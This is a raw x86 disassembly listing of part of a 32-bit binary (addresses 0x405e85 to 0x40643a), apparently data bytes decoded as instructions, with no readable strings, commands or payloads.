  405e85:	00 b1 04 ec 00 13    	add    %dh,0x1300ec04(%ecx)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 00                	add    %al,(%eax)
  405e8f:	00 80 00 16 20 c4    	add    %al,-0x3bdfea00(%eax)
  405e95:	04 f2                	add    $0xf2,%al
  405e97:	00 15 00 00 00 00    	add    %dl,0x0
  405e9d:	00 80 00 16 20 1c    	add    %al,0x1c201600(%eax)
  405ea3:	05 01 01 1d 00       	add    $0x1d0101,%eax
  405ea8:	20 42 00             	and    %al,0x0(%edx)
  405eab:	00 00                	add    %al,(%eax)
  405ead:	00 16                	add    %dl,(%esi)
  405eaf:	00 5b 05             	add    %bl,0x5(%ebx)
  405eb2:	0c 01                	or     $0x1,%al
  405eb4:	22 00                	and    (%eax),%al
  405eb6:	7c 42                	jl     0x405efa
  405eb8:	00 00                	add    %al,(%eax)
  405eba:	00 00                	add    %al,(%eax)
  405ebc:	11 00                	adc    %eax,(%eax)
  405ebe:	5f                   	pop    %edi
  405ebf:	05 10 01 22 00       	add    $0x220110,%eax
  405ec4:	50                   	push   %eax
  405ec5:	43                   	inc    %ebx
  405ec6:	00 00                	add    %al,(%eax)
  405ec8:	00 00                	add    %al,(%eax)
  405eca:	11 00                	adc    %eax,(%eax)
  405ecc:	71 05                	jno    0x405ed3
  405ece:	17                   	pop    %ss
  405ecf:	01 24 00             	add    %esp,(%eax,%eax,1)
  405ed2:	cc                   	int3
  405ed3:	43                   	inc    %ebx
  405ed4:	00 00                	add    %al,(%eax)
  405ed6:	00 00                	add    %al,(%eax)
  405ed8:	11 08                	adc    %ecx,(%eax)
  405eda:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405edb:	12 df                	adc    %bh,%bl
  405edd:	00 25 00 dc 43 00    	add    %ah,0x43dc00
  405ee3:	00 00                	add    %al,(%eax)
  405ee5:	00 11                	add    %dl,(%ecx)
  405ee7:	08 b2 12 df 00 26    	or     %dh,0x2600df12(%edx)
  405eed:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  405ef4:	06                   	push   %es
  405ef5:	18 36                	sbb    %dh,(%esi)
  405ef7:	01 13                	add    %edx,(%ebx)
  405ef9:	00 27                	add    %ah,(%edi)
  405efb:	00 c4                	add    %al,%ah
  405efd:	44                   	inc    %esp
  405efe:	00 00                	add    %al,(%eax)
  405f00:	00 00                	add    %al,(%eax)
  405f02:	16                   	push   %ss
  405f03:	00 7f 05             	add    %bh,0x5(%edi)
  405f06:	1d 01 27 00 3c       	sbb    $0x3c002701,%eax
  405f0b:	46                   	inc    %esi
  405f0c:	00 00                	add    %al,(%eax)
  405f0e:	00 00                	add    %al,(%eax)
  405f10:	11 18                	adc    %ebx,(%eax)
  405f12:	71 01                	jno    0x405f15
  405f14:	17                   	pop    %ss
  405f15:	00 2a                	add    %ch,(%edx)
  405f17:	00 60 46             	add    %ah,0x46(%eax)
  405f1a:	00 00                	add    %al,(%eax)
  405f1c:	00 00                	add    %al,(%eax)
  405f1e:	06                   	push   %es
  405f1f:	18 36                	sbb    %dh,(%esi)
  405f21:	01 13                	add    %edx,(%ebx)
  405f23:	00 2a                	add    %ch,(%edx)
  405f25:	00 68 46             	add    %ch,0x46(%eax)
  405f28:	00 00                	add    %al,(%eax)
  405f2a:	00 00                	add    %al,(%eax)
  405f2c:	16                   	push   %ss
  405f2d:	00 a9 05 17 00 2a    	add    %ch,0x2a001705(%ecx)
  405f33:	00 80 46 00 00 00    	add    %al,0x46(%eax)
  405f39:	00 11                	add    %dl,(%ecx)
  405f3b:	00 af 05 25 01 2a    	add    %ch,0x2a012505(%edi)
  405f41:	00 cc                	add    %cl,%ah
  405f43:	46                   	inc    %esi
  405f44:	00 00                	add    %al,(%eax)
  405f46:	00 00                	add    %al,(%eax)
  405f48:	11 00                	adc    %eax,(%eax)
  405f4a:	bc 05 2b 01 2b       	mov    $0x2b012b05,%esp
  405f4f:	00 c4                	add    %al,%ah
  405f51:	49                   	dec    %ecx
  405f52:	00 00                	add    %al,(%eax)
  405f54:	00 00                	add    %al,(%eax)
  405f56:	11 00                	adc    %eax,(%eax)
  405f58:	dd 05 32 01 2e 00    	fldl   0x2e0132
  405f5e:	6c                   	insb   (%dx),%es:(%edi)
  405f5f:	4a                   	dec    %edx
  405f60:	00 00                	add    %al,(%eax)
  405f62:	00 00                	add    %al,(%eax)
  405f64:	11 00                	adc    %eax,(%eax)
  405f66:	f3 05 ca 00 2f 00    	repz add $0x2f00ca,%eax
  405f6c:	00 00                	add    %al,(%eax)
  405f6e:	00 00                	add    %al,(%eax)
  405f70:	80 00 11             	addb   $0x11,(%eax)
  405f73:	20 21                	and    %ah,(%ecx)
  405f75:	06                   	push   %es
  405f76:	40                   	inc    %eax
  405f77:	01 2f                	add    %ebp,(%edi)
  405f79:	00 00                	add    %al,(%eax)
  405f7b:	00 00                	add    %al,(%eax)
  405f7d:	00 80 00 11 20 4e    	add    %al,0x4e201100(%eax)
  405f83:	06                   	push   %es
  405f84:	49                   	dec    %ecx
  405f85:	01 33                	add    %esi,(%ebx)
  405f87:	00 00                	add    %al,(%eax)
  405f89:	00 00                	add    %al,(%eax)
  405f8b:	00 80 00 11 20 66    	add    %al,0x66201100(%eax)
  405f91:	06                   	push   %es
  405f92:	4e                   	dec    %esi
  405f93:	01 34 00             	add    %esi,(%eax,%eax,1)
  405f96:	00 00                	add    %al,(%eax)
  405f98:	00 00                	add    %al,(%eax)
  405f9a:	80 00 11             	addb   $0x11,(%eax)
  405f9d:	20 75 06             	and    %dh,0x6(%ebp)
  405fa0:	56                   	push   %esi
  405fa1:	01 38                	add    %edi,(%eax)
  405fa3:	00 00                	add    %al,(%eax)
  405fa5:	00 00                	add    %al,(%eax)
  405fa7:	00 80 00 11 20 9f    	add    %al,-0x60dfef00(%eax)
  405fad:	06                   	push   %es
  405fae:	5b                   	pop    %ebx
  405faf:	01 39                	add    %edi,(%ecx)
  405fb1:	00 00                	add    %al,(%eax)
  405fb3:	00 00                	add    %al,(%eax)
  405fb5:	00 80 00 11 20 b3    	add    %al,-0x4cdfef00(%eax)
  405fbb:	06                   	push   %es
  405fbc:	5f                   	pop    %edi
  405fbd:	01 39                	add    %edi,(%ecx)
  405fbf:	00 00                	add    %al,(%eax)
  405fc1:	00 00                	add    %al,(%eax)
  405fc3:	00 80 00 11 20 df    	add    %al,-0x20dfef00(%eax)
  405fc9:	06                   	push   %es
  405fca:	66 01 3b             	add    %di,(%ebx)
  405fcd:	00 00                	add    %al,(%eax)
  405fcf:	00 00                	add    %al,(%eax)
  405fd1:	00 80 00 11 20 f3    	add    %al,-0xcdfef00(%eax)
  405fd7:	06                   	push   %es
  405fd8:	6b 01 3c             	imul   $0x3c,(%ecx),%eax
  405fdb:	00 00                	add    %al,(%eax)
  405fdd:	00 00                	add    %al,(%eax)
  405fdf:	00 80 00 11 20 0f    	add    %al,0xf201100(%eax)
  405fe5:	07                   	pop    %es
  405fe6:	71 01                	jno    0x405fe9
  405fe8:	3d 00 00 00 00       	cmp    $0x0,%eax
  405fed:	00 80 00 11 20 44    	add    %al,0x44201100(%eax)
  405ff3:	07                   	pop    %es
  405ff4:	76 01                	jbe    0x405ff7
  405ff6:	3e 00 00             	add    %al,%ds:(%eax)
  405ff9:	00 00                	add    %al,(%eax)
  405ffb:	00 80 00 11 20 81    	add    %al,-0x7edfef00(%eax)
  406001:	07                   	pop    %es
  406002:	83 01 45             	addl   $0x45,(%ecx)
  406005:	00 20                	add    %ah,(%eax)
  406007:	4b                   	dec    %ebx
  406008:	00 00                	add    %al,(%eax)
  40600a:	00 00                	add    %al,(%eax)
  40600c:	06                   	push   %es
  40600d:	18 36                	sbb    %dh,(%esi)
  40600f:	01 13                	add    %edx,(%ebx)
  406011:	00 47 00             	add    %al,0x0(%edi)
  406014:	28 4b 00             	sub    %cl,0x0(%ebx)
  406017:	00 00                	add    %al,(%eax)
  406019:	00 16                	add    %dl,(%esi)
  40601b:	00 9e 07 c1 00 47    	add    %bl,0x4700c107(%esi)
  406021:	00 b4 4b 00 00 00 00 	add    %dh,0x0(%ebx,%ecx,2)
  406028:	11 18                	adc    %ebx,(%eax)
  40602a:	71 01                	jno    0x40602d
  40602c:	17                   	pop    %ss
  40602d:	00 48 00             	add    %cl,0x0(%eax)
  406030:	00 00                	add    %al,(%eax)
  406032:	00 00                	add    %al,(%eax)
  406034:	80 00 16             	addb   $0x16,(%eax)
  406037:	20 b7 07 89 01 48    	and    %dh,0x48018907(%edi)
  40603d:	00 38                	add    %bh,(%eax)
  40603f:	4c                   	dec    %esp
  406040:	00 00                	add    %al,(%eax)
  406042:	00 00                	add    %al,(%eax)
  406044:	16                   	push   %ss
  406045:	00 d8                	add    %bl,%al
  406047:	07                   	pop    %es
  406048:	8e 01                	mov    (%ecx),%es
  40604a:	49                   	dec    %ecx
  40604b:	00 58 4c             	add    %bl,0x4c(%eax)
  40604e:	00 00                	add    %al,(%eax)
  406050:	00 00                	add    %al,(%eax)
  406052:	16                   	push   %ss
  406053:	00 0a                	add    %cl,(%edx)
  406055:	08 cc                	or     %cl,%ah
  406057:	01 4a 00             	add    %ecx,0x0(%edx)
  40605a:	00 00                	add    %al,(%eax)
  40605c:	00 00                	add    %al,(%eax)
  40605e:	80 00 16             	addb   $0x16,(%eax)
  406061:	20 21                	and    %ah,(%ecx)
  406063:	08 d1                	or     %dl,%cl
  406065:	01 4b 00             	add    %ecx,0x0(%ebx)
  406068:	ac                   	lods   %ds:(%esi),%al
  406069:	4c                   	dec    %esp
  40606a:	00 00                	add    %al,(%eax)
  40606c:	00 00                	add    %al,(%eax)
  40606e:	16                   	push   %ss
  40606f:	00 4d 08             	add    %cl,0x8(%ebp)
  406072:	dc 01                	faddl  (%ecx)
  406074:	4c                   	dec    %esp
  406075:	00 28                	add    %ch,(%eax)
  406077:	4d                   	dec    %ebp
  406078:	00 00                	add    %al,(%eax)
  40607a:	00 00                	add    %al,(%eax)
  40607c:	16                   	push   %ss
  40607d:	00 8b 08 c6 00 4c    	add    %cl,0x4c00c608(%ebx)
  406083:	00 00                	add    %al,(%eax)
  406085:	00 00                	add    %al,(%eax)
  406087:	00 80 00 16 20 9f    	add    %al,-0x60dfea00(%eax)
  40608d:	06                   	push   %es
  40608e:	5b                   	pop    %ebx
  40608f:	01 4c 00 00          	add    %ecx,0x0(%eax,%eax,1)
  406093:	00 00                	add    %al,(%eax)
  406095:	00 80 00 16 20 9e    	add    %al,-0x61dfea00(%eax)
  40609b:	08 e4                	or     %ah,%ah
  40609d:	01 4c 00 00          	add    %ecx,0x0(%eax,%eax,1)
  4060a1:	00 00                	add    %al,(%eax)
  4060a3:	00 80 00 16 20 b7    	add    %al,-0x48dfea00(%eax)
  4060a9:	08 ec                	or     %ch,%ah
  4060ab:	01 4f 00             	add    %ecx,0x0(%edi)
  4060ae:	84 4d 00             	test   %cl,0x0(%ebp)
  4060b1:	00 00                	add    %al,(%eax)
  4060b3:	00 16                	add    %dl,(%esi)
  4060b5:	00 d7                	add    %dl,%bh
  4060b7:	08 17                	or     %dl,(%edi)
  4060b9:	00 50 00             	add    %dl,0x0(%eax)
  4060bc:	bc 4d 00 00 00       	mov    $0x4d,%esp
  4060c1:	00 16                	add    %dl,(%esi)
  4060c3:	00 f3                	add    %dh,%bl
  4060c5:	05 ca 00 50 00       	add    $0x5000ca,%eax
  4060ca:	1c 4e                	sbb    $0x4e,%al
  4060cc:	00 00                	add    %al,(%eax)
  4060ce:	00 00                	add    %al,(%eax)
  4060d0:	16                   	push   %ss
  4060d1:	00 e4                	add    %ah,%ah
  4060d3:	08 f3                	or     %dh,%bl
  4060d5:	01 50 00             	add    %edx,0x0(%eax)
  4060d8:	38 4e 00             	cmp    %cl,0x0(%esi)
  4060db:	00 00                	add    %al,(%eax)
  4060dd:	00 16                	add    %dl,(%esi)
  4060df:	00 e9                	add    %ch,%cl
  4060e1:	08 f9                	or     %bh,%cl
  4060e3:	01 51 00             	add    %edx,0x0(%ecx)
  4060e6:	54                   	push   %esp
  4060e7:	4e                   	dec    %esi
  4060e8:	00 00                	add    %al,(%eax)
  4060ea:	00 00                	add    %al,(%eax)
  4060ec:	16                   	push   %ss
  4060ed:	00 ec                	add    %ch,%ah
  4060ef:	08 ca                	or     %cl,%dl
  4060f1:	00 52 00             	add    %dl,0x0(%edx)
  4060f4:	e4 4e                	in     $0x4e,%al
  4060f6:	00 00                	add    %al,(%eax)
  4060f8:	00 00                	add    %al,(%eax)
  4060fa:	16                   	push   %ss
  4060fb:	00 ef                	add    %ch,%bh
  4060fd:	08 9f 00 52 00 58    	or     %bl,0x58005200(%edi)
  406103:	4f                   	dec    %edi
  406104:	00 00                	add    %al,(%eax)
  406106:	00 00                	add    %al,(%eax)
  406108:	16                   	push   %ss
  406109:	00 02                	add    %al,(%edx)
  40610b:	09 ff                	or     %edi,%edi
  40610d:	01 53 00             	add    %edx,0x0(%ebx)
  406110:	c0 4f 00 00          	rorb   $0x0,0x0(%edi)
  406114:	00 00                	add    %al,(%eax)
  406116:	16                   	push   %ss
  406117:	00 11                	add    %dl,(%ecx)
  406119:	09 f3                	or     %esi,%ebx
  40611b:	01 55 00             	add    %edx,0x0(%ebp)
  40611e:	30 50 00             	xor    %dl,0x0(%eax)
  406121:	00 00                	add    %al,(%eax)
  406123:	00 16                	add    %dl,(%esi)
  406125:	00 1a                	add    %bl,(%edx)
  406127:	09 06                	or     %eax,(%esi)
  406129:	02 56 00             	add    0x0(%esi),%dl
  40612c:	d0 51 00             	rclb   $1,0x0(%ecx)
  40612f:	00 00                	add    %al,(%eax)
  406131:	00 16                	add    %dl,(%esi)
  406133:	00 25 09 06 02 57    	add    %ah,0x57020609
  406139:	00 60 53             	add    %ah,0x53(%eax)
  40613c:	00 00                	add    %al,(%eax)
  40613e:	00 00                	add    %al,(%eax)
  406140:	16                   	push   %ss
  406141:	00 2e                	add    %ch,(%esi)
  406143:	09 06                	or     %eax,(%esi)
  406145:	02 58 00             	add    0x0(%eax),%bl
  406148:	d4 53                	aam    $0x53
  40614a:	00 00                	add    %al,(%eax)
  40614c:	00 00                	add    %al,(%eax)
  40614e:	16                   	push   %ss
  40614f:	00 3c 09             	add    %bh,(%ecx,%ecx,1)
  406152:	06                   	push   %es
  406153:	02 59 00             	add    0x0(%ecx),%bl
  406156:	48                   	dec    %eax
  406157:	54                   	push   %esp
  406158:	00 00                	add    %al,(%eax)
  40615a:	00 00                	add    %al,(%eax)
  40615c:	16                   	push   %ss
  40615d:	00 54 09 0c          	add    %dl,0xc(%ecx,%ecx,1)
  406161:	01 5a 00             	add    %ebx,0x0(%edx)
  406164:	6c                   	insb   (%dx),%es:(%edi)
  406165:	54                   	push   %esp
  406166:	00 00                	add    %al,(%eax)
  406168:	00 00                	add    %al,(%eax)
  40616a:	16                   	push   %ss
  40616b:	00 60 09             	add    %ah,0x9(%eax)
  40616e:	17                   	pop    %ss
  40616f:	00 5a 00             	add    %bl,0x0(%edx)
  406172:	00 00                	add    %al,(%eax)
  406174:	00 00                	add    %al,(%eax)
  406176:	03 00                	add    (%eax),%eax
  406178:	06                   	push   %es
  406179:	18 36                	sbb    %dh,(%esi)
  40617b:	01 11                	add    %edx,(%ecx)
  40617d:	02 5a 00             	add    0x0(%edx),%bl
  406180:	00 00                	add    %al,(%eax)
  406182:	00 00                	add    %al,(%eax)
  406184:	03 00                	add    (%eax),%eax
  406186:	46                   	inc    %esi
  406187:	03 a5 09 17 02 5c    	add    0x5c021709(%ebp),%esp
  40618d:	00 00                	add    %al,(%eax)
  40618f:	00 00                	add    %al,(%eax)
  406191:	00 03                	add    %al,(%ebx)
  406193:	00 46 03             	add    %al,0x3(%esi)
  406196:	d5 09                	aad    $0x9
  406198:	22 02                	and    (%edx),%al
  40619a:	61                   	popa
  40619b:	00 00                	add    %al,(%eax)
  40619d:	00 00                	add    %al,(%eax)
  40619f:	00 03                	add    %al,(%ebx)
  4061a1:	00 46 03             	add    %al,0x3(%esi)
  4061a4:	f3 09 28             	repz or %ebp,(%eax)
  4061a7:	02 62 00             	add    0x0(%edx),%ah
  4061aa:	00 00                	add    %al,(%eax)
  4061ac:	00 00                	add    %al,(%eax)
  4061ae:	03 00                	add    (%eax),%eax
  4061b0:	06                   	push   %es
  4061b1:	18 36                	sbb    %dh,(%esi)
  4061b3:	01 11                	add    %edx,(%ecx)
  4061b5:	02 65 00             	add    0x0(%ebp),%ah
  4061b8:	00 00                	add    %al,(%eax)
  4061ba:	00 00                	add    %al,(%eax)
  4061bc:	03 00                	add    (%eax),%eax
  4061be:	46                   	inc    %esi
  4061bf:	03 a5 09 a7 03 67    	add    0x6703a709(%ebp),%esp
  4061c5:	00 00                	add    %al,(%eax)
  4061c7:	00 00                	add    %al,(%eax)
  4061c9:	00 03                	add    %al,(%ebx)
  4061cb:	00 46 03             	add    %al,0x3(%esi)
  4061ce:	d5 09                	aad    $0x9
  4061d0:	af                   	scas   %es:(%edi),%eax
  4061d1:	03 69 00             	add    0x0(%ecx),%ebp
  4061d4:	00 00                	add    %al,(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	03 00                	add    (%eax),%eax
  4061da:	46                   	inc    %esi
  4061db:	03 f3                	add    %ebx,%esi
  4061dd:	09 13                	or     %edx,(%ebx)
  4061df:	00 6a 00             	add    %ch,0x0(%edx)
  4061e2:	b4 44                	mov    $0x44,%ah
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	00 00                	add    %al,(%eax)
  4061e8:	06                   	push   %es
  4061e9:	18 36                	sbb    %dh,(%esi)
  4061eb:	01 13                	add    %edx,(%ebx)
  4061ed:	00 6a 00             	add    %ch,0x0(%edx)
  4061f0:	ec                   	in     (%dx),%al
  4061f1:	43                   	inc    %ebx
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	00 00                	add    %al,(%eax)
  4061f6:	06                   	push   %es
  4061f7:	08 9a 12 13 00 6a    	or     %bl,0x6a001312(%edx)
  4061fd:	00 00                	add    %al,(%eax)
  4061ff:	00 01                	add    %al,(%ecx)
  406201:	00 32                	add    %dh,(%edx)
  406203:	02 00                	add    (%eax),%al
  406205:	00 01                	add    %al,(%ecx)
  406207:	00 6b 02             	add    %ch,0x2(%ebx)
  40620a:	00 00                	add    %al,(%eax)
  40620c:	01 00                	add    %eax,(%eax)
  40620e:	6b 02 00             	imul   $0x0,(%edx),%eax
  406211:	00 01                	add    %al,(%ecx)
  406213:	00 02                	add    %al,(%edx)
  406215:	03 00                	add    (%eax),%eax
  406217:	00 01                	add    %al,(%ecx)
  406219:	00 d1                	add    %dl,%cl
  40621b:	03 00                	add    (%eax),%eax
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 1a                	add    %bl,(%edx)
  406221:	04 00                	add    $0x0,%al
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 27                	add    %ah,(%edi)
  406227:	04 00                	add    $0x0,%al
  406229:	00 01                	add    %al,(%ecx)
  40622b:	00 2e                	add    %ch,(%esi)
  40622d:	04 00                	add    $0x0,%al
  40622f:	00 01                	add    %al,(%ecx)
  406231:	00 1a                	add    %bl,(%edx)
  406233:	04 00                	add    $0x0,%al
  406235:	00 01                	add    %al,(%ecx)
  406237:	00 4e 04             	add    %cl,0x4(%esi)
  40623a:	00 00                	add    %al,(%eax)
  40623c:	01 00                	add    %eax,(%eax)
  40623e:	5d                   	pop    %ebp
  40623f:	0e                   	push   %cs
  406240:	00 00                	add    %al,(%eax)
  406242:	01 00                	add    %eax,(%eax)
  406244:	5d                   	pop    %ebp
  406245:	0e                   	push   %cs
  406246:	00 00                	add    %al,(%eax)
  406248:	01 00                	add    %eax,(%eax)
  40624a:	27                   	daa
  40624b:	04 00                	add    $0x0,%al
  40624d:	00 01                	add    %al,(%ecx)
  40624f:	00 6b 04             	add    %ch,0x4(%ebx)
  406252:	00 00                	add    %al,(%eax)
  406254:	01 00                	add    %eax,(%eax)
  406256:	2e 04 00             	cs add $0x0,%al
  406259:	00 01                	add    %al,(%ecx)
  40625b:	00 2e                	add    %ch,(%esi)
  40625d:	04 00                	add    $0x0,%al
  40625f:	00 01                	add    %al,(%ecx)
  406261:	00 9b 04 00 00 01    	add    %bl,0x1000004(%ebx)
  406267:	00 ac 04 00 00 01 00 	add    %ch,0x10000(%esp,%eax,1)
  40626e:	b9 04 00 00 02       	mov    $0x2000004,%ecx
  406273:	00 bd 04 00 00 01    	add    %bh,0x1000004(%ebp)
  406279:	00 dc                	add    %bl,%ah
  40627b:	04 00                	add    $0x0,%al
  40627d:	00 02                	add    %al,(%edx)
  40627f:	00 eb                	add    %ch,%bl
  406281:	04 00                	add    $0x0,%al
  406283:	00 03                	add    %al,(%ebx)
  406285:	00 f3                	add    %dh,%bl
  406287:	04 00                	add    $0x0,%al
  406289:	00 04 00             	add    %al,(%eax,%eax,1)
  40628c:	f5                   	cmc
  40628d:	04 00                	add    $0x0,%al
  40628f:	00 05 00 f7 04 00    	add    %al,0x4f700
  406295:	00 06                	add    %al,(%esi)
  406297:	00 fe                	add    %bh,%dh
  406299:	04 00                	add    $0x0,%al
  40629b:	00 07                	add    %al,(%edi)
  40629d:	00 06                	add    %al,(%esi)
  40629f:	05 00 00 08 00       	add    $0x80000,%eax
  4062a4:	11 05 00 00 01 00    	adc    %eax,0x10000
  4062aa:	35 05 00 20 02       	xor    $0x2200005,%eax
  4062af:	00 3d 05 00 00 03    	add    %bh,0x3000005
  4062b5:	00 46 05             	add    %al,0x5(%esi)
  4062b8:	00 20                	add    %ah,(%eax)
  4062ba:	04 00                	add    $0x0,%al
  4062bc:	4d                   	dec    %ebp
  4062bd:	05 00 00 05 00       	add    $0x50000,%eax
  4062c2:	55                   	push   %ebp
  4062c3:	05 00 00 01 00       	add    $0x10000,%eax
  4062c8:	67 05 00 00 02 00    	addr16 add $0x20000,%eax
  4062ce:	ac                   	lods   %ds:(%esi),%al
  4062cf:	04 00                	add    $0x0,%al
  4062d1:	00 01                	add    %al,(%ecx)
  4062d3:	00 78 05             	add    %bh,0x5(%eax)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	01 00                	add    %eax,(%eax)
  4062da:	5d                   	pop    %ebp
  4062db:	0e                   	push   %cs
  4062dc:	00 00                	add    %al,(%eax)
  4062de:	01 00                	add    %eax,(%eax)
  4062e0:	5d                   	pop    %ebp
  4062e1:	0e                   	push   %cs
  4062e2:	00 00                	add    %al,(%eax)
  4062e4:	01 00                	add    %eax,(%eax)
  4062e6:	83 05 00 00 02 00 8c 	addl   $0xffffff8c,0x20000
  4062ed:	05 00 00 03 00       	add    $0x30000,%eax
  4062f2:	6b 04 00 00          	imul   $0x0,(%eax,%eax,1),%eax
  4062f6:	01 00                	add    %eax,(%eax)
  4062f8:	b7 05                	mov    $0x5,%bh
  4062fa:	00 00                	add    %al,(%eax)
  4062fc:	01 00                	add    %eax,(%eax)
  4062fe:	c9                   	leave
  4062ff:	05 00 00 02 00       	add    $0x20000,%eax
  406304:	cf                   	iret
  406305:	05 00 00 03 00       	add    $0x30000,%eax
  40630a:	d6                   	salc
  40630b:	05 00 00 01 00       	add    $0x10000,%eax
  406310:	ec                   	in     (%dx),%al
  406311:	05 00 00 01 00       	add    $0x10000,%eax
  406316:	32 06                	xor    (%esi),%al
  406318:	00 00                	add    %al,(%eax)
  40631a:	02 00                	add    (%eax),%al
  40631c:	39 06                	cmp    %eax,(%esi)
  40631e:	00 00                	add    %al,(%eax)
  406320:	03 00                	add    (%eax),%eax
  406322:	3e 06                	ds push %es
  406324:	00 00                	add    %al,(%eax)
  406326:	04 00                	add    $0x0,%al
  406328:	43                   	inc    %ebx
  406329:	06                   	push   %es
  40632a:	00 00                	add    %al,(%eax)
  40632c:	01 00                	add    %eax,(%eax)
  40632e:	62 06                	bound  %eax,(%esi)
  406330:	00 00                	add    %al,(%eax)
  406332:	01 00                	add    %eax,(%eax)
  406334:	62 06                	bound  %eax,(%esi)
  406336:	00 00                	add    %al,(%eax)
  406338:	02 00                	add    (%eax),%al
  40633a:	c9                   	leave
  40633b:	05 00 00 03 00       	add    $0x30000,%eax
  406340:	cf                   	iret
  406341:	05 00 00 04 00       	add    $0x40000,%eax
  406346:	d6                   	salc
  406347:	05 00 00 01 00       	add    $0x10000,%eax
  40634c:	85 06                	test   %eax,(%esi)
  40634e:	00 00                	add    %al,(%eax)
  406350:	01 00                	add    %eax,(%eax)
  406352:	cc                   	int3
  406353:	06                   	push   %es
  406354:	02 00                	add    (%eax),%al
  406356:	02 00                	add    (%eax),%al
  406358:	d1 06                	roll   $1,(%esi)
  40635a:	00 00                	add    %al,(%eax)
  40635c:	01 00                	add    %eax,(%eax)
  40635e:	eb 06                	jmp    0x406366
  406360:	00 00                	add    %al,(%eax)
  406362:	01 00                	add    %eax,(%eax)
  406364:	04 07                	add    $0x7,%al
  406366:	00 00                	add    %al,(%eax)
  406368:	01 00                	add    %eax,(%eax)
  40636a:	21 07                	and    %eax,(%edi)
  40636c:	00 00                	add    %al,(%eax)
  40636e:	01 00                	add    %eax,(%eax)
  406370:	50                   	push   %eax
  406371:	07                   	pop    %es
  406372:	00 00                	add    %al,(%eax)
  406374:	02 00                	add    (%eax),%al
  406376:	59                   	pop    %ecx
  406377:	07                   	pop    %es
  406378:	00 00                	add    %al,(%eax)
  40637a:	03 00                	add    (%eax),%eax
  40637c:	04 07                	add    $0x7,%al
  40637e:	02 20                	add    (%eax),%ah
  406380:	04 00                	add    $0x0,%al
  406382:	63 07                	arpl   %eax,(%edi)
  406384:	00 00                	add    %al,(%eax)
  406386:	05 00 6c 07 00       	add    $0x76c00,%eax
  40638b:	00 06                	add    %al,(%esi)
  40638d:	00 74 07 00          	add    %dh,0x0(%edi,%eax,1)
  406391:	00 07                	add    %al,(%edi)
  406393:	00 7b 07             	add    %bh,0x7(%ebx)
  406396:	00 00                	add    %al,(%eax)
  406398:	01 00                	add    %eax,(%eax)
  40639a:	8f 07                	pop    (%edi)
  40639c:	00 00                	add    %al,(%eax)
  40639e:	02 00                	add    (%eax),%al
  4063a0:	95                   	xchg   %eax,%ebp
  4063a1:	07                   	pop    %es
  4063a2:	00 00                	add    %al,(%eax)
  4063a4:	01 00                	add    %eax,(%eax)
  4063a6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4063a7:	07                   	pop    %es
  4063a8:	00 00                	add    %al,(%eax)
  4063aa:	01 00                	add    %eax,(%eax)
  4063ac:	ce                   	into
  4063ad:	07                   	pop    %es
  4063ae:	00 00                	add    %al,(%eax)
  4063b0:	01 00                	add    %eax,(%eax)
  4063b2:	ea 07 00 00 01 00 1a 	ljmp   $0x1a00,$0x1000007
  4063b9:	08 00                	or     %al,(%eax)
  4063bb:	00 01                	add    %al,(%ecx)
  4063bd:	00 32                	add    %dh,(%edx)
  4063bf:	08 00                	or     %al,(%eax)
  4063c1:	00 01                	add    %al,(%ecx)
  4063c3:	00 cc                	add    %cl,%ah
  4063c5:	06                   	push   %es
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	02 00                	add    (%eax),%al
  4063ca:	ac                   	lods   %ds:(%esi),%al
  4063cb:	08 00                	or     %al,(%eax)
  4063cd:	00 03                	add    %al,(%ebx)
  4063cf:	00 b1 08 00 00 01    	add    %dh,0x1000008(%ecx)
  4063d5:	00 cf                	add    %cl,%bh
  4063d7:	08 00                	or     %al,(%eax)
  4063d9:	00 01                	add    %al,(%ecx)
  4063db:	00 e7                	add    %ah,%bh
  4063dd:	08 00                	or     %al,(%eax)
  4063df:	00 01                	add    %al,(%ecx)
  4063e1:	00 27                	add    %ah,(%edi)
  4063e3:	04 00                	add    $0x0,%al
  4063e5:	00 01                	add    %al,(%ecx)
  4063e7:	00 f8                	add    %bh,%al
  4063e9:	08 00                	or     %al,(%eax)
  4063eb:	00 01                	add    %al,(%ecx)
  4063ed:	00 ea                	add    %ch,%dl
  4063ef:	07                   	pop    %es
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	02 00                	add    (%eax),%al
  4063f4:	0b 09                	or     (%ecx),%ecx
  4063f6:	00 00                	add    %al,(%eax)
  4063f8:	01 00                	add    %eax,(%eax)
  4063fa:	0b 09                	or     (%ecx),%ecx
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	01 00                	add    %eax,(%eax)
  406400:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406401:	07                   	pop    %es
  406402:	00 00                	add    %al,(%eax)
  406404:	01 00                	add    %eax,(%eax)
  406406:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406407:	07                   	pop    %es
  406408:	00 00                	add    %al,(%eax)
  40640a:	01 00                	add    %eax,(%eax)
  40640c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40640d:	07                   	pop    %es
  40640e:	00 00                	add    %al,(%eax)
  406410:	01 00                	add    %eax,(%eax)
  406412:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406413:	07                   	pop    %es
  406414:	00 00                	add    %al,(%eax)
  406416:	01 00                	add    %eax,(%eax)
  406418:	7d 09                	jge    0x406423
  40641a:	00 00                	add    %al,(%eax)
  40641c:	02 00                	add    (%eax),%al
  40641e:	8a 09                	mov    (%ecx),%cl
  406420:	00 00                	add    %al,(%eax)
  406422:	01 00                	add    %eax,(%eax)
  406424:	c9                   	leave
  406425:	05 00 00 02 00       	add    $0x20000,%eax
  40642a:	cf                   	iret
  40642b:	05 00 00 03 00       	add    $0x30000,%eax
  406430:	d6                   	salc
  406431:	05 00 00 04 00       	add    $0x40000,%eax
  406436:	b1 09                	mov    $0x9,%cl
  406438:	00 00                	add    %al,(%eax)
  40643a:	05 00 c2 09 00       	add    $0x9c200,%eax
